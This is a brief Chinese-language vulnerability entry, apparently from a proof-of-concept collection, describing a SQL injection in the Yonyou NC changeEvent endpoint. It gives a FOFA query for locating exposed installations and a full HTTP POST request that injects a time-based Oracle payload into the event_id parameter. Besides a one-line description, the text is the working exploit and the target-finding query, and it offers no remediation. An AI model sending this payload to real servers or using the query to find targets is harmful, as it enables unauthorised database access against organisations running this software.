## 用友NC changeEvent SQL注入漏洞

## 漏洞描述
用友 NC `changeEvent` 接口存在 SQL 注入，攻击者可在数据库中执行任意语句。

## 网络空间测绘
```
fofa: app="用友-UFIDA-NC"
```

## POC
```
POST /portal/pt/oacoSchedulerEvents/changeEvent?pageId=login HTTP/1.1
Host: [请补充实际域名]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Connection: close

event_id=1' AND 1=dbms_pipe.receive_message('RDS',5) -- &startDate=2025-06-16 00:00:00&startDate_old=2025-06-16 24:00:00
```

## 参考
- 社区情报

